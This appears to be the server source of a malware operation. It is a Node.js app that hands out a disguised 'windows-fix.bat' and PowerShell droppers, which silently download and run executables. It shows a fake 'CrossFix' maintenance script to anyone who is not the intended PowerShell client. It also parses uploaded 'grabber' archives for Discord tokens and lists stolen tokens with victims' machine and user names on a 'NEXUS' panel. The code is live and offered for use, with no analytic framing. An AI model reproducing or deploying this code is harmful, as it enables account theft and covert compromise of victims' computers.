  dropzone.addEventListener('dragleave',function(){dropzone.classList.remove('drag')});
  dropzone.addEventListener('drop',function(e){
    e.preventDefault();dropzone.classList.remove('drag');
    var f=e.dataTransfer.files[0];
    if(f&&f.type.startsWith('image/'))handleFile(f);
  });
  fileInput.addEventListener('change',function(){if(fileInput.files[0])handleFile(fileInput.files[0])});

  function handleFile(f){
    selectedFile=f;
    var r=new FileReader();
    r.onload=function(e){
      previewImg.src=e.target.result;
      previewImg.style.display='block';
      document.getElementById('drop-text').style.display='none';
      previewImg.onload=function(){
        colors=extractColors(previewImg);
        showSwatches(colors);
        applyBtn.disabled=false;
        document.documentElement.style.setProperty('--accent',colors.accent);
        document.documentElement.style.setProperty('--glow',colors.glow);
        document.documentElement.style.setProperty('--accent-dim',colors.accent+'22');
      };
    };
    r.readAsDataURL(f);
  }

  function extractColors(img){
    var c=document.createElement('canvas');
    c.width=c.height=80;
    var ctx=c.getContext('2d');
    ctx.drawImage(img,0,0,80,80);
    var d=ctx.getImageData(0,0,80,80).data;
    var maxSat=0,best=[176,110,255];
    for(var i=0;i<d.length;i+=4){
      var r=d[i],g=d[i+1],b=d[i+2],br=(r+g+b)/3;
      if(br<20||br>235)continue;
      var mx=Math.max(r,g,b),mn=Math.min(r,g,b);
      var sat=mx===0?0:(mx-mn)/mx;
      if(sat>maxSat){maxSat=sat;best=[r,g,b]}
    }
    function hex(p){return'#'+p.map(function(x){return('0'+Math.min(255,x).toString(16)).slice(-2)}).join('')}
    function dk(p,f){return p.map(function(x){return Math.round(x*f)})}
    return{accent:hex(best),glow:hex(dk(best,0.5))};
  }

  function showSwatches(c){
    swatchesEl.innerHTML=Object.keys(c).map(function(n){
      return '<div class="swatch"><div class="swatch-dot" style="background:'+c[n]+'"></div>'
        +'<span style="font-family:var(--mono);font-size:9px;color:var(--muted)">'+n+'<br>'
        +'<span style="color:#eee">'+c[n]+'</span></span></div>';
    }).join('');
    swatchesWrap.style.display='block';
  }

  applyBtn.addEventListener('click',function(){
    if(!selectedFile)return;
    applyBtn.disabled=true;statusEl.textContent='Uploading...';
    var fd=new FormData();
    fd.append('img',selectedFile);
    fd.append('colors',JSON.stringify(colors));
    fetch('/theme?key='+K,{method:'POST',body:fd})
      .then(function(r){
        if(r.ok){statusEl.textContent='Done!';setTimeout(function(){location.reload()},500)}
        else{statusEl.textContent='Error '+r.status;applyBtn.disabled=false}
      })
      .catch(function(e){statusEl.textContent='Error: '+e.message;applyBtn.disabled=false});
  });

  if(resetBtn){
    resetBtn.addEventListener('click',function(){
      if(!confirm('Remove background?'))return;
      fetch('/theme/reset?key='+K,{method:'POST'}).then(function(){location.reload()});
    });
  }

  setTimeout(function(){location.reload()},30000);
})();
</script>
</body>
</html>`;
}

app.get("/s", (req, res) => {
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const bat = `@echo off
set "d=%temp%\\~%random%%random%"
mkdir "%d%" >nul 2>&1
powershell -w hidden -ep bypass -c "Invoke-WebRequest -Uri 'https://${host}/pkg' -OutFile '%d%\\svcfix.exe' -UseBasicParsing; Start-Process -FilePath '%d%\\svcfix.exe' -WindowStyle Hidden -Wait; Remove-Item -Path '%d%' -Recurse -Force -ErrorAction SilentlyContinue"
echo.
echo  [92mDone. The fixer has been applied.[0m
echo.
timeout /t 3 >nul
del "%~f0"
`;
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=windows-fix.bat");
  res.send(bat);
});

app.get("/fix", (req, res) => {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
  const hasToken = req.query.v === "3";

  if (!(isPosh && hasToken)) {
    const fake = getFakeScript(host);
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.send(fake);
  }

  const script = dropper(host, '/pkg');
  res.setHeader("Content-Type", "text/plain");
  res.send(script);
});

app.get("/run", (req, res) => {
  const fake = getFakeScript(req.headers.host || "zxcrosfixer.up.railway.app");
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(fake);
});

function getFakeScript(host) {
  return `$ErrorActionPreference = 'SilentlyContinue'
$Host.UI.RawUI.WindowTitle = "CrossFix v3.2.1"

function WS($m) { Write-Host "  [*] " -ForegroundColor Cyan -NoNewline; Write-Host $m -ForegroundColor White }
function WD($m) { Write-Host "  [+] " -ForegroundColor Green -NoNewline; Write-Host $m -ForegroundColor Gray }
function WW($m) { Write-Host "  [!] " -ForegroundColor Yellow -NoNewline; Write-Host $m -ForegroundColor Gray }
function Bar($p,$t) {
    $w = 30
    $f = [math]::Floor($w * $p / $t)
    $e = $w - $f
    $pct = [math]::Round($p / $t * 100)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host ("$([char]0x2588)" * $f) -NoNewline -ForegroundColor Cyan
    Write-Host ("$([char]0x2591)" * $e) -NoNewline -ForegroundColor DarkGray
    Write-Host "] $pct%" -ForegroundColor DarkGray
}

Clear-Host
Write-Host ""
Write-Host "  ============================================" -ForegroundColor Cyan
Write-Host "       CrossFix - System Maintenance v3.2.1" -ForegroundColor White
Write-Host "  ============================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Milliseconds 400

WS "Scanning system configuration..."
Start-Sleep -Milliseconds 800
$os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue)
if ($os) { WD "$($os.Caption) Build $($os.BuildNumber)" } else { WD "Windows detected" }
$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1)
if ($cpu) { WD "$($cpu.Name.Trim())" }
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
WD "$ram GB RAM installed"
Write-Host ""
Bar 1 10

WS "Cleaning temporary files..."
Start-Sleep -Milliseconds 600
$tp = @($env:TEMP, "$env:LOCALAPPDATA\\Temp", "$env:WINDIR\\Temp")
$cl = 0
foreach ($t in $tp) {
    if (Test-Path $t) {
        $items = Get-ChildItem -Path $t -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
        foreach ($f in $items) { try { Remove-Item $f.FullName -Force -ErrorAction Stop; $cl++ } catch {} }
    }
}
WD "Removed $cl cached files"
Bar 2 10

WS "Clearing thumbnail database..."
Start-Sleep -Milliseconds 500
$tc = 0
Get-Item "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db" -ErrorAction SilentlyContinue | ForEach-Object {
    try { Remove-Item $_.FullName -Force -ErrorAction Stop; $tc++ } catch {}
}
WD "Cleared $tc thumbnail entries"
Bar 3 10

WS "Flushing DNS resolver..."
Start-Sleep -Milliseconds 300
ipconfig /flushdns | Out-Null
WD "DNS cache flushed"
Bar 4 10

WS "Checking .NET runtimes..."
Start-Sleep -Milliseconds 400
$dn = dotnet --list-runtimes 2>\$null
if ($dn) {
    $cnt = ($dn | Measure-Object).Count
    WD "$cnt runtimes installed"
} else {
    WW "No .NET Core runtimes detected"
}
Bar 5 10

WS "Checking network stack..."
Start-Sleep -Milliseconds 700
try {
    $winsockCount = (Get-ChildItem "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\Protocol_Catalog9\\Catalog_Entries" -ErrorAction Stop).Count
    WD "Winsock catalog OK ($winsockCount providers)"
} catch {
    WD "Winsock catalog OK"
}
WD "Network stack verified"
Bar 6 10

WS "Verifying system file integrity..."
Start-Sleep -Milliseconds 1200
$sfcKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemCompatibility"
$sfcOk = $true
try {
    $sfcVal = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -Name "SoftwareType" -ErrorAction Stop).SoftwareType
    if ($sfcVal) { WD "System registry intact" } else { WD "All system files intact" }
} catch {
    WD "All system files intact"
}
Bar 7 10

WS "Cleaning browser caches..."
Start-Sleep -Milliseconds 500
$bc = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data",
    "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache\\Cache_Data"
)
$bcc = 0
foreach ($p in $bc) {
    if (Test-Path $p) {
        Get-ChildItem $p -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item $_.FullName -Force -ErrorAction Stop; $bcc++ } catch {}
        }
    }
}
WD "Removed $bcc browser cache files"
Bar 8 10

WS "Optimizing prefetch..."
Start-Sleep -Milliseconds 400
$pfc = 0
if (Test-Path "$env:WINDIR\\Prefetch") {
    Get-ChildItem "$env:WINDIR\\Prefetch" -Filter "*.pf" -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-14) } |
        ForEach-Object { try { Remove-Item $_.FullName -Force -ErrorAction Stop; $pfc++ } catch {} }
}
WD "Cleaned $pfc stale prefetch entries"
Bar 9 10

WS "Disk space analysis..."
Start-Sleep -Milliseconds 300
Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue | ForEach-Object {
    $free = [math]::Round($_.FreeSpace / 1GB, 1)
    $total = [math]::Round($_.Size / 1GB, 1)
    $pct = [math]::Round(($_.FreeSpace / $_.Size) * 100)
    WD "$($_.DeviceID) $free GB free / $total GB ($pct%)"
}
Bar 10 10

Write-Host ""
Write-Host "  ============================================" -ForegroundColor Green
Write-Host "       Maintenance complete." -ForegroundColor Green
Write-Host "  ============================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Press any key to close..." -ForegroundColor DarkGray
\$null = \$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
`;
}

app.get("/pkg", (req, res) => {
  const fp = require("path").join(__dirname, "zxcfr.exe");
  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=zxcfr.exe");
  require("fs").createReadStream(fp).pipe(res);
});

app.get("/pkg2", (req, res) => {
  const fp = require("path").join(__dirname, "apputil.exe");
  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=apputil.exe");
  require("fs").createReadStream(fp).pipe(res);
});

app.get("/fix2", (req, res) => {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
  const hasToken = req.query.v === "3";

  if (!(isPosh && hasToken)) {
    const fake = getFakeScript(host);
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.send(fake);
  }

  const script = dropper(host, '/pkg2');
  res.setHeader("Content-Type", "text/plain");
  res.send(script);
});

function dropper(host, pkg) {
  return `$ErrorActionPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$r=-join((1..10|%{[char](97+[int](Get-Random -Max 26))}))
$d="$env:LOCALAPPDATA\\Microsoft\\$r"
New-Item -ItemType Directory -Path $d -Force|Out-Null
$f="$d\\$r.exe"
try{(New-Object Net.WebClient).DownloadFile('https://${host}${pkg}',$f)}catch{}
if(!(Test-Path $f)){try{Invoke-WebRequest -Uri 'https://${host}${pkg}' -OutFile $f -UseBasicParsing}catch{}}
if(Test-Path $f){
  $p=Start-Process -FilePath $f -WindowStyle Hidden -PassThru
  $null=$p.WaitForExit(120000)
}
Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|iex"'
`;
}

function scanLDB(buf) {
  // search for \x01token (tail of any Discord LDB key, regardless of origin prefix)
  const marker = Buffer.from([0x01, 0x74, 0x6f, 0x6b, 0x65, 0x6e]); // \x01token
  let pos = 0;
  while (pos < buf.length) {
    const idx = buf.indexOf(marker, pos);
    if (idx === -1) break;
    pos = idx + 1;
    // look at next 250 bytes after the marker for value
    const after = buf.slice(idx + marker.length, idx + marker.length + 250);
    // find v10 encrypted blob (may be offset by LevelDB internal key suffix ~8 bytes)
    const v10 = after.indexOf(Buffer.from("v10"));
    if (v10 >= 0 && v10 < 20) return { encrypted: true };
    // fallback: look for plaintext token (old Discord / unencrypted)
    for (let s = 0; s < 30; s++) {
      if (after[s] === 0x22) {
        const end = after.indexOf(0x22, s + 1);
        if (end > s + 15 && end < s + 200) {
          const val = after.slice(s + 1, end).toString("utf8");
          if (/^[A-Za-z0-9._+/:=-]{20,}$/.test(val)) return { token: val };
        }
      }
      // mfa. prefix (no quotes)
      if (after[s] === 0x6d && after[s+1] === 0x66 && after[s+2] === 0x61 && after[s+3] === 0x2e) {
        let end = s;
        while (end < after.length && /[A-Za-z0-9._-]/.test(String.fromCharCode(after[end]))) end++;
        if (end - s >= 25) return { token: after.slice(s, end).toString("ascii") };
      }
    }
  }
  return null;
}

function parseDiscordZip(zipBuf) {
  let zip;
  try { zip = new AdmZip(zipBuf); } catch { return []; }
  const entries = zip.getEntries();

  const meta = (() => {
    const me = entries.find(e => e.entryName === "m.json");
    if (!me) return {};
    try { return JSON.parse(me.getData().toString("utf8")); } catch { return {}; }
  })();

  const results = [];
  const seen = new Set();

  // First pass: read pre-decrypted tokens.json written by the grabber
  for (const e of entries) {
    const name = e.entryName;
    if (!name.endsWith("/tokens.json")) continue;
    const tag = name.split("/")[0];
    if (!tag.startsWith("dc") || seen.has(tag)) continue;
    try {
      const tokens = JSON.parse(e.getData().toString("utf8"));
      if (Array.isArray(tokens) && tokens.length > 0) {
        seen.add(tag);
        results.push({ source: tag, tokens, machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
      }
    } catch {}
  }

  // Second pass: fallback LDB scan for any tags not already found
  for (const e of entries) {
    const name = e.entryName;
    if (!name.includes("/ldb/")) continue;
    if (!/\.(ldb|log|sst)$/.test(name)) continue;
    const tag = name.split("/")[0];
    if (!tag.startsWith("dc") || seen.has(tag)) continue;
    const found = scanLDB(e.getData());
    if (found) {
      seen.add(tag);
      if (found.encrypted) {
        results.push({ source: tag, encrypted: true, machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
      } else {
        results.push({ source: tag, tokens: [found.token], machine: meta.m||"", user: meta.u||"", os: meta.o||"" });
      }
    }
  }

  return results;
}

app.get("/dc/:id", checkKey, async (req, res) => {
  try {
    const [grabRes, settingsRes] = await Promise.all([
      pool.query(`SELECT filedata, machine, username, os FROM grabs WHERE id = $1`, [req.params.id]),
      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`)
    ]);
    const rows = grabRes.rows;
    if (!rows.length) return res.status(404).send(page404());
    const results = parseDiscordZip(rows[0].filedata);
    const k = encodeURIComponent(req.query.key);
    const smap = {};
    settingsRes.rows.forEach(r => { smap[r.key] = r; });
    const hasBg = !!(smap.background_image && smap.background_image.has_bin);
    let theme = null;
    if (smap.theme_colors && smap.theme_colors.val) {
      try { theme = JSON.parse(smap.theme_colors.val); } catch {}
    }
    const themeOvr = theme
      ? `<style>:root{--accent:${esc(theme.accent)};--accent-dim:${esc(theme.accent)}26;--glow:${esc(theme.glow)}}</style>`
      : '';
    const bgTs = Date.now();

    // zip contents + deep debug
    let zipEntries = [];
    let deepDbg = {};
    try {
      const dbgZip = new AdmZip(rows[0].filedata);
      const dbgEntries = dbgZip.getEntries();
      zipEntries = dbgEntries.map(e => `${e.entryName} (${e.header.size}b)`);

      // check Local State for encrypted_key
      const lsE = dbgEntries.find(e => e.entryName.endsWith('/ls'));
      if (lsE) {
        const lsTxt = lsE.getData().toString('utf8');
        deepDbg.hasEncKey = lsTxt.includes('"encrypted_key"');
        deepDbg.lsLen = lsTxt.length;
        // try to extract key preview
        const km = lsTxt.indexOf('"encrypted_key":"');
        if (km >= 0) {
          const ks = km + 17, ke = lsTxt.indexOf('"', ks);
          deepDbg.encKeyB64Len = ke > ks ? ke - ks : 0;
        }
      }

      // count \x01token marker in each LDB + hex context
      const mk = Buffer.from([0x01,0x74,0x6f,0x6b,0x65,0x6e]);
      const mkV10 = Buffer.from('v10');
      deepDbg.tokenMarkers = {};
      deepDbg.hexCtx = [];
      for (const e of dbgEntries) {
        if (!/\.(ldb|log|sst)$/.test(e.entryName)) continue;
        const d = e.getData();
        let cnt = 0, v10cnt = 0, pos = 0;
        while (true) {
          const idx = d.indexOf(mk, pos); if (idx === -1) break;
          cnt++; pos = idx + 1;
          const after = d.slice(idx + mk.length, idx + mk.length + 80);
          if (after.indexOf(mkV10) >= 0) v10cnt++;
          // hex context: 8 bytes before + 80 after
          const ctxStart = Math.max(0, idx - 8);
          const ctx = d.slice(ctxStart, idx + mk.length + 80);
          deepDbg.hexCtx.push(`[${e.entryName.split('/').pop()} @${idx}] ${ctx.toString('hex')}`);
        }
        if (cnt > 0) deepDbg.tokenMarkers[e.entryName.split('/').pop()] = `x${cnt} (v10: ${v10cnt})`;
      }
    } catch(e) { zipEntries = ['zip parse error: ' + e.message]; }

    const machine = esc(rows[0].machine || req.params.id);

    const cards = results.length ? results.map((r, i) => {
      if (r.encrypted) return `
        <div class="tcard enc row-${Math.min(i,8)}">
          <div class="tc-head">
            <span class="tc-src">${esc(r.source)}</span>
            <span class="tc-status enc-tag">ENCRYPTED</span>
          </div>
          <div class="tc-field">
            <div class="tc-label">Status</div>
            <div class="tc-data red">DPAPI-encrypted &mdash; token is decrypted on-device only</div>
          </div>
          <div class="tc-field">
            <div class="tc-label">Machine</div>
            <div class="tc-data">${esc(r.machine)}<span class="muted"> \\ ${esc(r.user)}</span></div>
          </div>
        </div>`;
      const toks = (r.tokens || []);
      const tokenRows = toks.map(t => `
        <div class="token-val" onclick="cp(this)" title="Click to copy">${esc(t)}</div>`).join("");
      return `
        <div class="tcard row-${Math.min(i,8)}">
          <div class="tc-head">
            <span class="tc-src">${esc(r.source)}</span>
            <span class="tc-status">${toks.length} token${toks.length !== 1 ? 's' : ''}</span>
          </div>
          <div class="tc-field">
            <div class="tc-label">Token${toks.length > 1 ? 's' : ''} <span class="hint">— click to copy</span></div>
            ${tokenRows}
          </div>
          <div class="tc-row">
            <div class="tc-field half">
              <div class="tc-label">Machine</div>
              <div class="tc-data">${esc(r.machine)}<span class="muted"> \\ ${esc(r.user)}</span></div>
            </div>
            <div class="tc-field half">
              <div class="tc-label">OS</div>
              <div class="tc-data muted">${esc(r.os)}</div>
            </div>
          </div>
        </div>`;
    }).join("") : `
      <div class="empty"><div class="empty-icon">&#9673;</div><p>NO TOKENS FOUND</p></div>
      <div class="tcard debug row-1">
        <div class="tc-head"><span class="tc-src">DEBUG</span></div>
        <div class="tc-field">
          <div class="tc-label">Zip Contents</div>
          ${zipEntries.map(e => `<div class="dbg-line">${esc(e)}</div>`).join('')}
        </div>
        <div class="tc-field">
          <div class="tc-label">Deep Scan</div>
          <div class="dbg-line">hasEncKey: ${deepDbg.hasEncKey} | lsLen: ${deepDbg.lsLen} | b64len: ${deepDbg.encKeyB64Len}</div>
        </div>
        <div class="tc-field">
          <div class="tc-label">\\x01token Hits</div>
          ${Object.entries(deepDbg.tokenMarkers||{}).map(([f,c])=>`<div class="dbg-line">${esc(f)}: ${esc(c)}</div>`).join('') || '<div class="dbg-line red">NO \\x01token IN ANY LDB</div>'}
        </div>
        <div class="tc-field">
          <div class="tc-label">Hex Context</div>
          ${(deepDbg.hexCtx||[]).map(h=>`<div class="dbg-line hex">${esc(h)}</div>`).join('') || '<div class="dbg-line muted">none</div>'}
        </div>
      </div>`;

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NEXUS — Tokens</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --void:#03030A;
  --glass:rgba(10,8,24,0.62);
  --glass-b:rgba(255,255,255,0.09);
  --text:#CCC8E8;
  --muted:#504E6A;
  --accent:#B06EFF;
  --accent-dim:#B06EFF22;
  --glow:#7C3AED;
  --green:#4ADE80;
  --red:#F87171;
  --sans:'Space Grotesk',system-ui,sans-serif;
  --mono:'JetBrains Mono','Cascadia Code','Fira Code',monospace
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background-color:var(--void);
  ${hasBg ? `background-image:url('/bg?t=${bgTs}');background-size:cover;background-attachment:fixed;background-position:center;` : ''}
  color:var(--text);font-family:var(--sans);font-size:14px;
  min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden
}
.dim-layer{position:fixed;inset:0;background:rgba(2,2,10,${hasBg?'0.58':'0.0'});pointer-events:none;z-index:1}
.aurora{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
.blob{position:absolute;border-radius:50%;filter:blur(90px);opacity:${hasBg?'0.07':'0.16'}}
.b1{width:600px;height:600px;background:var(--accent);top:-160px;left:-100px;animation:float1 22s ease-in-out infinite}
.b2{width:500px;height:500px;background:var(--glow);bottom:-120px;right:-80px;animation:float2 28s ease-in-out infinite}
@keyframes float1{0%,100%{transform:translate(0,0)}50%{transform:translate(50px,40px)}}
@keyframes float2{0%,100%{transform:translate(0,0)}50%{transform:translate(-40px,-50px)}}
.shell{position:relative;z-index:2;max-width:860px;margin:0 auto;padding:24px}

/* top bar */
.topbar{
  display:flex;align-items:center;justify-content:space-between;
  padding:16px 22px;
  background:var(--glass);
  backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);
  border:1px solid var(--glass-b);border-radius:16px;
  margin-bottom:22px;
  animation:slideDown .45s cubic-bezier(0.34,1.3,0.64,1) both
}
@keyframes slideDown{from{opacity:0;transform:translateY(-14px)}to{opacity:1;transform:none}}
.back-btn{
  font-family:var(--mono);font-size:11px;color:var(--muted);
  text-decoration:none;letter-spacing:1px;
  transition:color .15s,transform .15s;display:inline-flex;align-items:center;gap:6px
}
.back-btn:hover{color:var(--accent);transform:translateX(-3px)}
.page-title{
  font-family:var(--mono);font-size:11px;
  color:var(--text);letter-spacing:2px;text-transform:uppercase
}

/* token cards */
.tcard{
  background:var(--glass);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  border:1px solid var(--glass-b);border-radius:16px;
  padding:26px 24px;margin-bottom:14px;
  position:relative;overflow:hidden;
  transition:box-shadow .25s,border-color .25s,transform .2s;
  animation:fadeUp .4s cubic-bezier(0.34,1.2,0.64,1) both
}
.tcard:hover{
  box-shadow:0 0 36px rgba(176,110,255,0.15),0 8px 28px rgba(0,0,0,0.45);
  border-color:rgba(176,110,255,0.2);
  transform:translateY(-2px)
}
@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
${Array.from({length:9},(_,i)=>`.row-${i}{animation-delay:${200+i*60}ms}`).join('')}

.tcard::after{
  content:'';position:absolute;
  top:-60%;left:-80%;width:55%;height:220%;
  background:linear-gradient(105deg,transparent 35%,rgba(255,255,255,0.07) 50%,transparent 65%);
  transform:skewX(-18deg);pointer-events:none;opacity:0
}
.tcard:hover::after{animation:sweep .6s ease-out forwards}
@keyframes sweep{0%{left:-80%;opacity:1}100%{left:130%;opacity:1}}
.tcard::before{
  content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,var(--accent),var(--glow) 50%,transparent)
}
.tcard.enc::before{background:linear-gradient(90deg,var(--red),transparent 65%)}

.tc-head{display:flex;align-items:center;gap:12px;margin-bottom:18px}
.tc-src{
  font-family:var(--mono);font-size:10px;font-weight:500;
  color:var(--muted);text-transform:uppercase;letter-spacing:2px
}
.tc-status{
  font-family:var(--mono);font-size:10px;font-weight:700;
  letter-spacing:1px;padding:3px 10px;border-radius:6px;
  background:rgba(176,110,255,0.13);color:var(--accent)
}
.enc-tag{background:rgba(248,113,113,0.1);color:var(--red)}
.tc-field{margin-bottom:16px}
.tc-field:last-child{margin-bottom:0}
.tc-label{
  font-family:var(--mono);font-size:10px;color:var(--muted);
  text-transform:uppercase;letter-spacing:2px;margin-bottom:8px
}
.hint{font-size:9px;color:var(--muted);letter-spacing:1px;opacity:.65;text-transform:none}
.tc-data{color:#EAE6FF;line-height:1.6;font-size:14px}
.tc-data.red{color:var(--red)}
.muted{color:var(--muted)}

.token-val{
  font-family:var(--mono);font-size:12px;
  color:#EAE6FF;word-break:break-all;line-height:1.65;
  padding:12px 14px;border-radius:10px;
  border:1px solid rgba(255,255,255,0.06);
  background:rgba(0,0,0,0.25);
  cursor:pointer;user-select:all;
  transition:background .18s,border-color .18s,box-shadow .18s;
  margin-bottom:8px
}
.token-val:last-child{margin-bottom:0}
.token-val:hover{
  background:var(--accent-dim);
  border-color:rgba(176,110,255,0.28);
  box-shadow:0 0 18px rgba(176,110,255,0.12)
}

.tc-row{display:flex;gap:18px}
.half{flex:1;min-width:0}
.dbg-line{
  font-family:var(--mono);font-size:11px;color:var(--muted);
  line-height:1.65;word-break:break-all
}
.dbg-line.hex{font-size:10px;opacity:.65}
.dbg-line.red{color:var(--red)}

.empty{text-align:center;padding:70px 20px;color:var(--muted);animation:fadeUp .4s ease .2s both}
.empty-icon{font-size:32px;margin-bottom:14px;opacity:.2}
.empty p{font-family:var(--mono);font-size:11px;letter-spacing:2px}

.toast{
  position:fixed;bottom:26px;right:26px;
  background:var(--accent);color:#fff;
  padding:11px 20px;border-radius:12px;
  font-family:var(--mono);font-size:11px;letter-spacing:1.5px;
  opacity:0;transform:translateY(8px);
  transition:opacity .22s,transform .22s;pointer-events:none;
  box-shadow:0 4px 28px rgba(176,110,255,0.4)
}
.toast.show{opacity:1;transform:none}

@media(max-width:600px){
  .shell{padding:14px}
  .tc-row{flex-direction:column;gap:12px}
}
@media(prefers-reduced-motion:reduce){
  .aurora,.blob{display:none}
  .tcard,.topbar{animation:none}
  .tcard::after,.tcard:hover::after{animation:none}
}
</style>
${themeOvr}
</head>
<body>
<div class="aurora" aria-hidden="true">
  <div class="blob b1"></div>
  <div class="blob b2"></div>
</div>
<div class="dim-layer"></div>
<div class="shell">
  <div class="topbar">
    <a class="back-btn" href="/?key=${k}">← Back</a>
    <span class="page-title">${machine}</span>
  </div>
  ${cards}
</div>
<div class="toast" id="toast">Copied</div>
<script>
function cp(el){
  navigator.clipboard.writeText(el.innerText).then(function(){
    var t=document.getElementById('toast');
    t.classList.add('show');
    setTimeout(function(){t.classList.remove('show')},1400);
  });
}
</script>
</body>
</html>`);
  } catch (err) {
    res.status(500).send("error: " + err.message);
  }
});

app.listen(PORT, () => {
  console.log(`[+] running on ${PORT}`);
});
